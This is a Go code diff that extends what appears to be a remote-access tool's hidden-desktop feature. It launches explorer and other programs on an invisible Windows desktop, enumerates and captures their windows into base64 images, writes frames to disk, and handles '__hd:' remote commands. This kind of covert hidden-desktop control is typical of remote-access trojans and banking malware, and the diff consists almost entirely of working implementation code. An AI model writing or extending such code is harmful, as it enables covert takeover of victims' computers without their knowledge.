@@ -6,6 +6,7 @@ import (
 	"encoding/base64"
 	"encoding/binary"
 	"fmt"
+	"os"
 	"runtime"
 	"strconv"
 	"strings"
@@ -41,6 +42,19 @@ var (
 	procDeleteObject      = hdGdi32.NewProc("DeleteObject")
 	procDeleteDC          = hdGdi32.NewProc("DeleteDC")
 	procCreateProcessW    = hdKernel32.NewProc("CreateProcessW")
+	procRegisterClassW    = hdUser32.NewProc("RegisterClassW")
+	procCreateWindowExW   = hdUser32.NewProc("CreateWindowExW")
+	procDefWindowProcW    = hdUser32.NewProc("DefWindowProcW")
+	procShowWindow        = hdUser32.NewProc("ShowWindow")
+	procEnumWindows       = hdUser32.NewProc("EnumWindows")
+	procPrintWindow       = hdUser32.NewProc("PrintWindow")
+	procGetWindowDC       = hdUser32.NewProc("GetWindowDC")
+	procGetWindowRect     = hdUser32.NewProc("GetWindowRect")
+	procIsWindowVisible   = hdUser32.NewProc("IsWindowVisible")
+	procIsIconic          = hdUser32.NewProc("IsIconic")
+	procGetDesktopWindow  = hdUser32.NewProc("GetDesktopWindow")
+	procFillRect          = hdUser32.NewProc("FillRect")
+	procCreateSolidBrush  = hdGdi32.NewProc("CreateSolidBrush")
 	procCloseHandle       = hdKernel32.NewProc("CloseHandle")
 )
 
@@ -118,6 +132,14 @@ func nativeUser() string {
 }
 
 func handleHiddenDesktop(cmd string) string {
+	if !hdIsHost && strings.HasPrefix(cmd, "__hd:frame") {
+		if img := readHDFile(); img != "" {
+			return img
+		}
+	}
+	if windowsSession() == 0 && !hdIsHost {
+		return hdViaHost(cmd)
+	}
 	rest := strings.TrimPrefix(cmd, "__hd:")
 	action, arg, _ := strings.Cut(strings.TrimSpace(rest), " ")
 	action = strings.TrimSpace(action)
@@ -165,40 +187,93 @@ func hdEnsure() error {
 	return nil
 }
 
+func hdSpawn(exe string) uint32 {
+	desktop, _ := syscall.UTF16PtrFromString(`WinSta0\` + hdName)
+	cmd, err := syscall.UTF16FromString(exe)
+	if err != nil {
+		return 0
+	}
+	var si syscall.StartupInfo
+	si.Cb = uint32(unsafe.Sizeof(si))
+	si.Desktop = desktop
+	si.Flags = hdStartfUseShowWindow
+	si.ShowWindow = 3
+	var pi syscall.ProcessInformation
+	ok, _, _ := procCreateProcessW.Call(0, uintptr(unsafe.Pointer(&cmd[0])), 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&si)), uintptr(unsafe.Pointer(&pi)))
+	runtime.KeepAlive(cmd)
+	runtime.KeepAlive(desktop)
+	if ok == 0 {
+		return 0
+	}
+	procCloseHandle.Call(uintptr(pi.Process))
+	procCloseHandle.Call(uintptr(pi.Thread))
+	return pi.ProcessId
+}
+
+var hdStarted bool
+var hdOwnHWND uintptr
+var hdWndCB = syscall.NewCallback(func(hwnd, msg, wp, lp uintptr) uintptr {
+	r, _, _ := procDefWindowProcW.Call(hwnd, msg, wp, lp)
+	return r
+})
+
+func hdMakeWindow() {
+	class, _ := syscall.UTF16PtrFromString("HdView")
+	title, _ := syscall.UTF16PtrFromString("Desktop")
+	type wndClass struct {
+		style         uint32
+		proc          uintptr
+		clsExtra      int32
+		wndExtra      int32
+		instance      syscall.Handle
+		icon          syscall.Handle
+		cursor        syscall.Handle
+		background    syscall.Handle
+		menu, class   *uint16
+	}
+	wc := wndClass{proc: hdWndCB, class: class}
+	procRegisterClassW.Call(uintptr(unsafe.Pointer(&wc)))
+	hwnd, _, _ := procCreateWindowExW.Call(0, uintptr(unsafe.Pointer(class)), uintptr(unsafe.Pointer(title)), 0x10000000|0x00CF0000, 40, 40, 900, 600, 0, 0, 0, 0)
+	if hwnd != 0 {
+		hdOwnHWND = hwnd
+		procShowWindow.Call(hwnd, 5)
+		hdc, _, _ := procGetDC.Call(hwnd)
+		if hdc != 0 {
+			brush, _, _ := procCreateSolidBrush.Call(0x00FFFFFF)
+			box := struct{ left, top, right, bottom int32 }{0, 0, 900, 600}
+			procFillRect.Call(hdc, uintptr(unsafe.Pointer(&box)), brush)
+			procDeleteObject.Call(brush)
+			procReleaseDC.Call(hwnd, hdc)
+		}
+	}
+	runtime.KeepAlive(class)
+	runtime.KeepAlive(title)
+}
+
 func hdStart(exe string) string {
-	if exe == "" {
-		exe = `C:\Windows\explorer.exe`
+	if hdStarted {
+		return "desktop already started"
 	}
 	return hdOnDesktop(func() string {
-		desktop, _ := syscall.UTF16PtrFromString(`WinSta0\` + hdName)
-		cmd, err := syscall.UTF16FromString(exe)
-		if err != nil {
-			return "bad command: " + err.Error()
+		pid := hdSpawn(`C:\Windows\explorer.exe`)
+		if pid == 0 {
+			pid = hdSpawn(`C:\Windows\System32\notepad.exe`)
+		} else {
+			hdSpawn(`C:\Windows\System32\notepad.exe`)
 		}
-		var si syscall.StartupInfo
-		si.Cb = uint32(unsafe.Sizeof(si))
-		si.Desktop = desktop
-		si.Flags = hdStartfUseShowWindow
-		si.ShowWindow = hdSwShow
-		var pi syscall.ProcessInformation
-		ok, _, callErr := procCreateProcessW.Call(
-			0,
-			uintptr(unsafe.Pointer(&cmd[0])),
-			0, 0, 0,
-			0x10,
-			0, 0,
-			uintptr(unsafe.Pointer(&si)),
-			uintptr(unsafe.Pointer(&pi)),
-		)
-		runtime.KeepAlive(cmd)
-		runtime.KeepAlive(desktop)
-		if ok == 0 {
-			return "spawn failed: " + callErr.Error()
+		if exe != "" {
+			if extra := hdSpawn(exe); pid == 0 {
+				pid = extra
+			}
 		}
-		pid := pi.ProcessId
-		procCloseHandle.Call(uintptr(pi.Process))
-		procCloseHandle.Call(uintptr(pi.Thread))
-		return fmt.Sprintf("desktop started pid=%d", pid)
+		if pid == 0 {
+			return "spawn failed"
+		}
+		hdStarted = true
+		hdMakeWindow()
+		hdWins = nil
+		procEnumWindows.Call(hdEnumCB, 0)
+		return fmt.Sprintf("desktop started pid=%d session=%d windows=%d", pid, windowsSession(), len(hdWins))
 	})
 }
 
@@ -217,13 +292,66 @@ func hdFrame() string {
 		defer runtime.UnlockOSThread()
 		ch <- hdCapture()
 	}()
-	return <-ch
+	select {
+	case out := <-ch:
+		return out
+	case <-time.After(3 * time.Second):
+		return "frame timed out"
+	}
+}
+
+var hdWins []uintptr
+
+func hdEnumProc(hwnd, lparam uintptr) uintptr {
+	vis, _, _ := procIsWindowVisible.Call(hwnd)
+	if vis != 0 && len(hdWins) < 32 {
+		hdWins = append(hdWins, hwnd)
+	}
+	return 1
+}
+
+var hdEnumCB = syscall.NewCallback(hdEnumProc)
+
+func hdPaintWindows(dst uintptr, sw, sh, dw, dh int) {
+	if sw < 1 || sh < 1 {
+		return
+	}
+	hdWins = nil
+	procEnumWindows.Call(hdEnumCB, 0)
+	for i := len(hdWins) - 1; i >= 0; i-- {
+		hwnd := hdWins[i]
+		var rc struct{ left, top, right, bottom int32 }
+		procGetWindowRect.Call(hwnd, uintptr(unsafe.Pointer(&rc)))
+		ww := int(rc.right - rc.left)
+		wh := int(rc.bottom - rc.top)
+		if ww < 8 || wh < 8 {
+			continue
+		}
+		src, _, _ := procGetWindowDC.Call(hwnd)
+		if src == 0 {
+			continue
+		}
+		tmp, _, _ := procCreateCompatibleDC.Call(src)
+		bits, _, _ := procCreateCompatibleBitmap.Call(src, uintptr(ww), uintptr(wh))
+		old, _, _ := procSelectObject.Call(tmp, bits)
+		procPrintWindow.Call(hwnd, tmp, 2)
+		procStretchBlt.Call(tmp, 0, 0, uintptr(ww), uintptr(wh), src, 0, 0, uintptr(ww), uintptr(wh), hdSrcCopy)
+		x := int(rc.left) * dw / sw
+		y := int(rc.top) * dh / sh
+		pw := ww * dw / sw
+		ph := wh * dh / sh
+		if pw > 0 && ph > 0 {
+			procStretchBlt.Call(dst, uintptr(x), uintptr(y), uintptr(pw), uintptr(ph), tmp, 0, 0, uintptr(ww), uintptr(wh), hdSrcCopy)
+		}
+		procSelectObject.Call(tmp, old)
+		procDeleteObject.Call(bits)
+		procDeleteDC.Call(tmp)
+		procReleaseDC.Call(hwnd, src)
+	}
 }
 
 func hdCapture() string {
-	if r, _, err := procSetThreadDesktop.Call(uintptr(hdDesktop)); r == 0 {
-		return "set desktop failed: " + err.Error()
-	}
+	procSetThreadDesktop.Call(uintptr(hdDesktop))
 	hdc, _, _ := procGetDC.Call(0)
 	if hdc == 0 {
 		return "no desktop dc"
@@ -235,9 +363,9 @@ func hdCapture() string {
 		sw, sh = 1024, 768
 	}
 	dw, dh := int(sw), int(sh)
-	if dw > 320 {
-		dh = dh * 320 / dw
-		dw = 320
+	if dw > 480 {
+		dh = dh * 480 / dw
+		dw = 480
 	}
 	if dh < 1 {
 		dh = 1
@@ -253,7 +381,18 @@ func hdCapture() string {
 	}
 	defer procDeleteObject.Call(bmp)
 	old, _, _ := procSelectObject.Call(memDC, bmp)
-	procStretchBlt.Call(memDC, 0, 0, uintptr(dw), uintptr(dh), hdc, 0, 0, sw, sh, hdSrcCopy)
+	brush, _, _ := procCreateSolidBrush.Call(0x00462814)
+	rect := struct{ left, top, right, bottom int32 }{0, 0, int32(dw), int32(dh)}
+	procFillRect.Call(memDC, uintptr(unsafe.Pointer(&rect)), brush)
+	procDeleteObject.Call(brush)
+	if hdOwnHWND != 0 {
+		wdc, _, _ := procGetDC.Call(hdOwnHWND)
+		if wdc != 0 {
+			procStretchBlt.Call(memDC, 8, 8, uintptr(dw-16), uintptr(dh/2), wdc, 0, 0, 900, 600, hdSrcCopy)
+			procReleaseDC.Call(hdOwnHWND, wdc)
+		}
+	}
+	hdPaintWindows(memDC, int(sw), int(sh), dw, dh)
 	procSelectObject.Call(memDC, old)
 	stride := ((dw*3 + 3) / 4) * 4
 	pixels := make([]byte, stride*dh)
@@ -275,7 +414,9 @@ func hdCapture() string {
 	binary.LittleEndian.PutUint16(file[26:], 1)
 	binary.LittleEndian.PutUint16(file[28:], 24)
 	copy(file[54:], pixels)
-	return fmt.Sprintf("HDIMG:%d,%d:", sw, sh) + base64.StdEncoding.EncodeToString(file)
+	img := fmt.Sprintf("HDIMG:%d,%d:", dw, dh) + base64.StdEncoding.EncodeToString(file)
+	os.WriteFile(hdFilePath(), []byte(img), 0644)
+	return img
 }
 
 func hdKey(vk int) string {
